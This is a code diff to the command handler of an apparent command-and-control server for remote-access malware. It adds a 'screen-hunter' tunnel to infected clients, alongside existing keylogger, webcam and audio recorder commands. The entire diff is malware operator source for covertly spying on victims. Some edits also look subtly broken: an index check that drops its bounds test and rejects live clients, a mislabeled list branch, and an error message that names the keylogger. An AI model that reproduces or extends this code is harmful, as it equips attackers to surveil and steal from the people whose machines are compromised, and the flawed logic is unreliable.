@@ -153,6 +153,13 @@ CommandHandler::CommandHandler(
         {HELP_ARG, INDEX_ARG, REMOVE_ARG, DEVICE_ARG, FILE_NAME_ARG, CONVERT_ARG, OUT_ARG},
         {}
     ));
+    command_map_.emplace("screen-hunter", Command(
+        "Start a screen hunter terminal between server and target with a specialized command line. Usage:\n\t screen-hunter -i <client_index>.\n\tscreen-hunter -rm -i <client_index> to stop the tunnel",
+        &CommandHandler::screen_hunter,
+        this,
+        {HELP_ARG, REMOVE_ARG},
+        {INDEX_ARG}
+    ));
 }
 
 CommandHandler::~CommandHandler() {
@@ -267,8 +274,8 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
 
     if (temp_arg_map.find(INDEX_ARG) != temp_arg_map.end()) {
         int index_value = std::any_cast<int>(temp_arg_map[INDEX_ARG]);
-        if (index_value < 0 || index_value >= p_clients_->size()) {
-            *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << index_value << RESET_C2_FIFO;
+        if (index_value < 0 || p_clients_->at(index_value) == nullptr || ClientHandler::is_client_up(p_clients_->at(index_value)->socket())) {
+            *p_event_log_ << LOG_MUST << RED << "Client is not up or invalid client index: " << index_value << RESET_C2_FIFO;
             return -1;
         }
     }
@@ -278,8 +285,6 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
 }
 
 int CommandHandler::parse_command(const std::string& __root_cmd) {
-    
-
     if (!command_exists(__root_cmd)) {
         *p_event_log_ << LOG_MUST << RED << "Command not found: " << __root_cmd << ". Type help to see all the available commands" << RESET_C2_FIFO;
         return -1;
@@ -436,7 +441,7 @@ void CommandHandler::list() {
                         *p_event_log_ << "\n__webcam_recorder__:";
                     } else if ((*it)->command_code_ == AUDIO_RECORDER) {
                         *p_event_log_ << "\n__audio_recorder__:";
-                    } else if ((*it)->command_code_ == SCREEN_RECORDER) {
+                    } else if ((*it)->command_code_ == SCREEN_HUNTER) {
                         *p_event_log_ << "\nscreen__recorder__:";
                     }
                 }
@@ -517,7 +522,7 @@ void CommandHandler::keylogger() {
             send_client(KEYLOGGER, 0, client_index);
             *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
         } else {
-            *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
         }
     } else {
         if (p_tunnel == nullptr) {
@@ -648,6 +653,40 @@ void CommandHandler::webcam_recorder() {
             }
         } else {
             *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Webcam Recorder is already active for client " << client_index << RESET_C2_FIFO;
+        }
+    }
+}
+
+void CommandHandler::screen_hunter() {
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    Tunnel* p_tunnel = get_tunnel(client_index, SCREEN_HUNTER);
+
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
+        if (p_tunnel != nullptr) {
+            uint64_t u = 1;
+            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
+            send_client(SCREEN_HUNTER, 0, client_index);
+            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::screen_hunter] Screen_hunter removed from client " << client_index << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Screen_hunter is not active for client " << client_index << RESET_C2_FIFO; 
+        }
+    } else {
+        if (p_tunnel == nullptr) {
+            ScreenHunter* p_screen_hunter = new ScreenHunter();
+
+            Tunnel* tunnel = new Tunnel(client_index, SCREEN_HUNTER, p_screen_hunter);
+            {
+                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+                p_tunnels_->emplace_back(tunnel);
+            }
+            try {
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
+            } catch (const std::system_error& e) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Error creating thread for keylogger" << RESET_C2_FIFO;
+                erase_tunnel(p_tunnels_, client_index, SCREEN_HUNTER);
+            }
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Screen Hunter is already active for client " << client_index << RESET_C2_FIFO;
         }
     }
 }
